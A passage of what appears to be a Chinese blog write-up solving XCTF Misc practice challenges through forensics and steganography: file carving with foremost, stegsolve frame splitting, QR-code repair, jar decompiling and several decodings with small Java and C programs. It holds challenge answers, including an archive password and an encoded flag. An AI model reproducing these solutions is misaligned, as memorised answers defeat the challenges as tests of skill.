src="https://img-blog.csdnimg.cn/20201029153505599.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029153603932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）接着在kali中用foremost分离附件.pcapng文件，得到一个zip文件，里面有一个压缩包，包含flag文件。使用上面图片中的“Th1s_1s_p4sswd_!!!”作为密码，获取flag。</p><p>#foremost已在kali中预安装，使用如下命令安装</p><pre><code class="javascript">$sudo apt-get install foremost       //非管理员需要加上sudo</code></pre><p>#分离文件</p><pre><code class="javascript">$foremost -t all ctf.pcapng         </code></pre><p>#执行完上面的语句后，会生成一个output目录，进入该目录即可查看分离的文件。</p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>（1）附件是一张gif的动图，查看后可发现图片里存在一个二维码。于是这里用stegsolve工具将动图分解为一张张图片，以便查看。<br><img src="https://img-blog.csdnimg.cn/2020102916030193.png#pic_center" alt="在这里插入图片描述"><br>（2）找到那张出现二维码的图片，发现定位点缺失。百度下载一张二维码定位点图片，接着打开Windows自带的画图工具，选择“新建”，然后依次把定位点图片和二维码图片通过“粘贴来源“导入，将定位点拖拽到缺失的地方，保存即可。（不会ps只能这样了，嘤嘤嘤~）<br>#下载的定位点图片可能会有一些白色边框，在合成图片时可能会覆盖掉二维码。同样可以在画图工具里，打开定位点图片，通过多次“旋转”的操作，然后不断调整白色画布的大小去掉边框，去掉边框后保存就可以了。<br><img src="https://img-blog.csdnimg.cn/20201029161225356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）二维码图片补全后，用二维码扫描器扫描就可以得到flag了。<br><img src="https://img-blog.csdnimg.cn/20201029162926218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>#stegsolve工具：<br>File Format:文件格式，这个主要是查看图片的具体信息<br>Data Extract:数据抽取，图片中隐藏数据的抽取<br>Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看<br>Image Combiner:拼图，图片拼接<br>#stegsolve打开方式：<br>（1）首先需要添加java环境，这里就不赘述了。<br>（2）打开stegsolve所在目录，在目录框输入cmd，打开运行窗口<br><img src="https://img-blog.csdnimg.cn/20201029163702280.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020102916372191.png#pic_center" alt="在这里插入图片描述"><br>（3）在运行窗口输入以下命令即可打开：</p><pre><code>java -jar stegsolve.jar</code></pre><p><img src="https://img-blog.csdnimg.cn/20201029163957823.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029164057932.png#pic_center" alt="在这里插入图片描述"></p><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>（1）附件是一个.jar文件，在cmd下用java -jar xxxx.jar查看<br><img src="https://img-blog.csdnimg.cn/20201029164458822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）用jd-gui工具反编译，在cn.bjsxt.plane.PlaneGameFrame.class文件下发现flag（Ctrl+F搜索）<br><img src="https://img-blog.csdnimg.cn/20201029165606637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>（1）解压附件，在gif文件夹下看到许多黑白的图片，联想到二进制<br><img src="https://img-blog.csdnimg.cn/20201029170006125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）将各个图片转化为对应的二进制，使用在线二进制转字符串工具<a href="http://www.txttool.com/WenBen_BinaryStr.asp">http://www.txttool.com/WenBen_BinaryStr.asp</a>即可得到flag。</p><h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p><img src="https://img-blog.csdnimg.cn/20201029172950592.png#pic_center" alt="在这里插入图片描述"><br>（1）获取的报文内容为0-9，a-f，考虑十六进制。但该串十六进制数无法直接转化为字符串（ASCII值）<br>（2）把十六进制两两一组转换为十进制；接着将十进制数减去128（因为ASCII码值为0~127），让其落到ASCII码表上，然后计算出对应ASCII码值的字符，获取flag。<br>（3）采用如下java编写的代码：</p><pre><code>public class Misc &#123;    public static void main(String[] args) &#123;        // TODO Auto-generated method stub        String hex=&quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;;        String temp=&quot;&quot;;        String flag=&quot;&quot;;        for(int i = 0; i &lt; hex.length();i+=2) &#123;            temp=hex.substring(i,i+2);   //获取相邻的字符            long dec=Long.parseLong(temp,16);    //将两个字符转换为十进制            flag=Long.toString(dec-128);         //将Long型的十进制值减去128，再转换为String            System.out.print((char)Integer.parseInt(flag));   //解析flag为十进制整数，并强制转换为char，存取字符        &#125;    &#125;&#125;</code></pre><p>（4）查看执行结果<br><img src="https://img-blog.csdnimg.cn/20201029173408937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>（1）附件是一串禅语<br><img src="https://img-blog.csdnimg.cn/2020102917361431.png#pic_center" alt="在这里插入图片描述"><br>（2）使用在线工具使用“与佛论禅”来进行解码（解码时记得在原文字的开头加上“佛曰：”）在线工具：<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br><img src="https://img-blog.csdnimg.cn/20201029173842414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）根据题目提示的13掌，用rot-13解码</p><p>#rot13使用一个简单的替换加密算法，类似凯撒密码<br><img src="https://img-blog.csdnimg.cn/20201029174109664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）又是一串密文，用base64试试，看到flag。<br><img src="https://img-blog.csdnimg.cn/20201029174247479.png#pic_center" alt="在这里插入图片描述"></p><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>（1）附件是一个pdf文件，全选后复制到一个word文档里，发现了一串特殊的字符<br><img src="https://img-blog.csdnimg.cn/20201029174606857.png#pic_center" alt="在这里插入图片描述"><br>（2）看到AB，但不是培根密码，培根密码是5个一组，联想到摩斯密码将A替换为. ，B替换为-，可以自己写个代码转换一下（这里我用的c语言）</p><pre><code>int main()&#123;    char word[200];    gets(word);    int i=0;    while(word[i] != 0)&#123;        if(word[i] == &#39;A&#39;)&#123;            word[i]=&#39;.&#39;;            printf(&quot;%c&quot;,word[i]);        &#125;        if(word[i]  == &#39; &#39;)&#123;            printf(&quot; &quot;);        &#125;        if(word[i] == &#39;B&#39;)&#123;            word[i]=&#39;-&#39;;            printf(&quot;%c&quot;,word[i]);        &#125;//        printf(&quot;%s&quot;,word[i]);        i++;    &#125;    system(&quot;pause&quot;);    return 0;</code></pre><p>（3）然后放到在线摩斯密码加解密上解密<a href="http://www.txttool.com/t/?id=Mzg1">http://www.txttool.com/t/?id=Mzg1</a>（注意分割的时候空格也要输入）<br><img src="https://img-blog.csdnimg.cn/20201029175536902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p>（1）解压附件得到一张两帧的图片<br><img src="https://img-blog.csdnimg.cn/20201029180040104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）现将这两帧图片分别保存，然后用stegsolve分别打开，发现是都是缺失一半的二维码图片<br><img src="https://img-blog.csdnimg.cn/20201029180455273.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020102918051475.png#pic_center" alt="在这里插入图片描述"><br>（3）利用画图工具，将两张图拼在一起，并将定位点补充完整，用二维码扫描器扫描即可<br><img src="https://img-blog.csdnimg.cn/20201029180621881.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029180648595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc练习区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
